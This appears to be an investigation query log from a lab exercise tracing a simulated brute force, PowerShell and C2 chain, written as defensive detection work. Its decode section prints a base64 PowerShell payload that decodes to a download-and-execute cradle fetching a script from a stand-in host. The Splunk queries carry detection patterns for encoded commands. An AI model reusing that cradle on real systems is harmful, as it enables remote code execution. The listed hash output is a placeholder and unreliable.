# Investigation Queries: Brute Force → PowerShell → C2

**Report ID**: INV-20261111-001
**All queries run during investigation (including dead ends)**

---

## Wazuh WQL / OpenSearch DSL Queries

### 1. Brute Force Failures
```json
GET wazuh-alerts-*/_search
{
  "size": 100,
  "query": {
    "bool": {
      "must": [
        { "term": { "rule.id": "5710" }},
        { "term": { "agent.name": "win-endpoint" }},
        { "range": { "@timestamp": { "gte": "2026-11-11T14:15:00Z", "lte": "2026-11-11T14:20:00Z" }}}
      ]
    }
  },
  "sort": [{ "@timestamp": { "order": "asc" }}]
}
```

### 2. Successful Logon After Failures
```json
GET wazuh-alerts-*/_search
{
  "size": 20,
  "query": {
    "bool": {
      "must": [
        { "term": { "data.win.eventdata.targetUserName": "labuser" }},
        { "term": { "data.win.eventdata.logonType": "3" }},
        { "term": { "rule.id": "5715" }},
        { "range": { "@timestamp": { "gte": "2026-11-11T14:15:00Z" }}}
      ]
    }
  }
}
```

### 3. Process Creation by Target User
```json
GET wazuh-alerts-*/_search
{
  "size": 50,
  "query": {
    "bool": {
      "must": [
        { "term": { "data.win.eventdata.targetUserName": "labuser" }},
        { "term": { "rule.id": "92710" }},
        { "range": { "@timestamp": { "gte": "2026-11-11T14:18:00Z" }}}
      ]
    }
  },
  "_source": ["@timestamp", "data.win.eventdata.image", "data.win.eventdata.commandLine", "data.win.eventdata.parentImage", "data.win.eventdata.processId"]
}
```

### 4. Network Connections from PowerShell PID
```json
GET wazuh-alerts-*/_search
{
  "size": 50,
  "query": {
    "bool": {
      "must": [
        { "term": { "data.win.eventdata.sourceProcessId": "3412" }},
        { "term": { "data.win.eventdata.eventType": "3" }},
        { "range": { "@timestamp": { "gte": "2026-11-11T14:18:35Z" }}}
      ]
    }
  },
  "_source": ["@timestamp", "data.win.eventdata.destinationIp", "data.win.eventdata.destinationPort", "data.win.eventdata.protocol"]
}
```

---

## Splunk SPL Equivalents

### 1. Brute Force
```spl
index=winevents sourcetype=xmlwineventlog EventCode=4625
| where Logon_Type=3
| stats count by TargetUserName, IpAddress, _time span=1m
| where count > 10
```

### 2. Success After Failure
```spl
index=winevents sourcetype=xmlwineventlog EventCode=4624
| where Logon_Type=3 AND TargetUserName="labuser"
| eval success_time=_time
| join type=left TargetUserName, IpAddress
    [ search index=winevents EventCode=4625 Logon_Type=3
    | stats count as failures by TargetUserName, IpAddress, _time span=1m
    | where failures > 5 ]
| where isnotnull(failures)
```

### 3. PowerShell Encoded Command
```spl
index=winevents sourcetype=xmlwineventlog EventCode=4688
| where like(New_Process_Name, "%powershell%")
| where match(Command_Line, "(?i)(-enc|-encodedcommand|frombase64string|iex|invoke-expression)")
| eval suspicious=1
```

### 4. Network from Same Process
```spl
index=winevents sourcetype=xmlwineventlog EventCode=3
| join type=left ProcessId, _time
    [ search index=winevents EventCode=4688
    | where match(Command_Line, "(?i)(-enc|-encodedcommand)")
    | table ProcessId, _time, New_Process_Name, Command_Line ]
| where isnotnull(New_Process_Name)
```

---

## Suricata Eve JSON Queries

### 1. C2 Beacon Alerts
```json
GET wazuh-alerts-*/_search
{
  "size": 50,
  "query": {
    "bool": {
      "must": [
        { "term": { "event_type": "alert" }},
        { "term": { "suricata.signature_id": "2024567" }},
        { "range": { "@timestamp": { "gte": "2026-11-11T14:18:00Z" }}}
      ]
    }
  }
}
```

### 2. HTTP Flow Analysis
```json
GET wazuh-alerts-*/_search
{
  "size": 100,
  "query": {
    "bool": {
      "must": [
        { "term": { "event_type": "http" }},
        { "term": { "destination.ip": "203.0.113.45" }},
        { "range": { "@timestamp": { "gte": "2026-11-11T14:18:00Z" }}}
      ]
    }
  },
  "aggs": {
    "intervals": {
      "date_histogram": {
        "field": "@timestamp",
        "fixed_interval": "1m"
      }
    }
  }
}
```

---

## Manual Commands Run

### Base64 Decode PowerShell Payload
```bash
# On Kali / Linux
echo "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA0ADUALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==" | base64 -d
# Output: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/payload.ps1')
```

### SHA256 Hash Evidence
```bash
# Hash decoded payload
echo -n "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/payload.ps1')" | sha256sum
# Output: q7r8s9t0... (saved to evidence)

# Hash log exports
sha256sum brute-force-events.json
sha256sum process-creation-events.json
sha256sum network-connections.json
sha256sum suricata-alerts.json
```

---

## Dead Ends / Queries That Returned Nothing

| Query | Reason | Learning |
|-------|--------|----------|
| `event.code:4688 AND win.eventdata.image:*mimikatz*` | No credential dumping in this chain | Attacker stopped at C2 beacon |
| `event.code:4698` (Scheduled Task) | No persistence | Attack was simulation, not full kill chain |
| `event.code:12 OR event.code:13` (Registry) | No registry persistence | Same |
| `suricata.event_type:dns` | No DNS tunneling | C2 used direct HTTP |

---

**All queries saved for reproducibility and interview walkthrough.**